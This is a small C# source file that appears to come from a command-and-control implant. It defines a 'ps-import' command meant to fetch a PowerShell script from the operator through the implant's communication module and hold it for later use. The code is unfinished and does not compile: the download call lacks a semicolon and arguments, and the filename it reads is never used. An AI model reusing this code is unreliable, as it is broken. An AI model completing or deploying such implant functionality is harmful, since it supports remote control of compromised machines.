using Agent.Internal;
using Agent.Models;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Agent.Commands
{
    public class PowerShellImportCommand : AgentCommand
    {
        public override string Name => "ps-import";
        public override void InnerExecute(AgentTask task, Models.Agent agent, AgentTaskResult result, CommModule commm)
        {
            var filename = task.SplittedArgs[0];
            Script = commm.Download()
        }

        public static byte[] Script { get; set; }
    }
}
